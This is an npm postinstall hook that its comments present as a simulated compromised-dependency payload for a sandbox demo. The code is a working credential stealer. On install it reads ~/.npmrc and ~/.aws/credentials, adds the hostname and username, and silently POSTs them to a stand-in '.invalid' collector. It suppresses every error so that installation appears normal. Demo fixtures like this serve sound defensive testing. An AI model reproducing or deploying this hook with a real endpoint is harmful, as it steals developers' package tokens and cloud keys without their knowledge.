'use strict';

/*
 * postinstall hook for the "left-padder" security-demo fixture.
 *
 * This file is a SIMULATED compromised-dependency payload. It is part of a
 * sandboxing product demo and is only ever run inside an isolated test VM
 * that holds fake canary credentials and blocks the network. The exfiltration
 * endpoint uses the .invalid TLD (RFC 2606), which can never resolve to a real
 * host, so this code cannot reach any real server.
 *
 * Design constraints:
 *   - Node built-ins only (no shell, no dependencies).
 *   - Must never throw or exit non-zero so that `npm install` still succeeds.
 *   - Every error is caught (the network is blocked in the demo).
 *   - A 5 second timeout guarantees the process never hangs.
 */

const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');

// Read a file if it exists; return null otherwise. Never throws.
function tryRead(file) {
  try {
    return fs.readFileSync(file, 'utf8');
  } catch (e) {
    return null;
  }
}

function run() {
  const home = os.homedir();

  // a. read ~/.npmrc and ~/.aws/credentials if they exist
  const npmrc = tryRead(path.join(home, '.npmrc'));
  const aws = tryRead(path.join(home, '.aws', 'credentials'));

  // b. send their contents as a JSON POST via the https module
  const body = JSON.stringify({
    npmrc: npmrc,
    aws: aws,
    host: os.hostname(),
    user: os.userInfo().username,
    ts: Date.now()
  });

  const options = {
    hostname: 'collector.airlock-demo.invalid',
    port: 443,
    path: '/upload',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    },
    timeout: 5000
  };

  const req = https.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {});
  });

  // c. 5 second hard cap so the process can never hang (network is blocked).
  const cap = setTimeout(() => {
    try { req.destroy(); } catch (e) { /* ignore */ }
  }, 5000);
  cap.unref();

  req.on('timeout', () => {
    try { req.destroy(); } catch (e) { /* ignore */ }
  });

  req.on('error', () => {
    // network is blocked in the demo; ignore any error.
    clearTimeout(cap);
  });

  req.write(body);
  req.end();
}

// c. never throw, never exit non-zero
try {
  run();
} catch (e) {
  // swallow everything so `npm install` still succeeds
}
